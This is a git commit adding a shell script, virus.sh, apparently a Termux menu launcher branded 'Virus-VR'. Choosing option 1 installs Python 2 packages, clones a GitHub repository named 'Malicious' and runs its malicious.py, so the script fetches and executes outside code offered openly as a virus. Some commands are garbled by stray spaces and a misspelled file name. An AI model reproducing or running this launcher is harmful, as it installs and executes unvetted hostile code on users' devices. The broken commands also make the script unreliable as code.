b2de7d13a145b0766d3768ed044de4f6fb105d26
S1nt4x16 <50811498+S1nt4x16@users.noreply.github.com>
2019-05-22 17:40:05 +0700

    New Upload

---
+++ virus.sh
@@ -0,0 +1,36 @@
+clear
+figlet Virus-VR | lolcat
+echo "============================
+# Created By :Valentinus Moreno
+
+# Name : Synt4x16
+
+# Gunakan Buat Yang Bener Aja
+============================" | lolcat
+
+sleep 2
+
+echo "(1) Virus
+(2) Exit" | lolcat 
+echo " Pilih Ya : " | lolcat
+read nomor
+
+if [ $nomor = 1 ] || [ $nomor = 01 ]
+then
+clear
+pkg install git
+pkg install python2
+pip2 install mechanize
+pip2 install requests
+git clone https://github.com/Hider5/Malicious
+pip2 install -r requirements. txt
+chmod 777 melicious. py
+python2 malicious. py
+fi
+
+if [ $nomor = 2 ] || [ $nomor = 02 ] 
+then 
+clear
+echo "Created By : Synt4x16" | lolcat
+exit
+fi
